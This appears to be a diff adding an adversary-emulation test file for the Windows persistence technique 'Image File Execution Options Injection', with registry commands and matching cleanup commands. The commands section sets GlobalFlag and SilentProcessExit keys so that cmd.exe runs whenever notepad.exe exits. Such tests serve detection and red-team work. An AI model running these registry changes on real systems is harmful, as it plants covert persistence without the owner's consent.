@@ -1,0 +1,15 @@
+#TechniqueName: Event Triggered Execution: Image File Execution Options Injection
+#AtomicTestName: IFEO Global Flags
+#Language: cmd
+
+#commands
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"
+
+
+#cleanup_commands
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\notepad.exe" /v GlobalFlag /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v ReportingMode /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe" /v MonitorProcess /f >nul 2>&1
+
